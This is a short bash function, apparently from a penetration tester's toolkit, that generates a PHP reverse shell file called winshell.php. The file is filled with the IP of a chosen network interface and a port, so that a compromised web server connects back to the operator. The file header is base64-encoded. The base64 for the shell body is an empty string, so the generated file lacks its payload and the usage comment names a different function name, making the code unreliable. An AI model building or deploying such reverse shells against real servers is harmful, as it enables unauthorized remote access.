win-phprev() {
  # Easy way of creating php reverse shell for your desired interface and your prefered port number
  # Outputs to whatever directory you are currently in.
  # Usage: phprev <interface> <port>
  # Example: phprev tun0 1337
  ipaddy=$(ip -f inet addr show "$1" | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
  port="$2"
  
  filetop=$(base64 -d <<< "PD9waHANCmhlYWRlcignQ29udGVudC10eXBlOiB0ZXh0L3BsYWluJyk7")

  filebottom=$(base64 -d <<< "")
  
  echo -e "$filetop\n\$ip = '$ipaddy';\n\$port = $port; \n$filebottom" > winshell.php
  echo -e "\e[0;35mCreated winshell.php in current directory, with ip = '$ipaddy' and port = $port\e[0m"
}
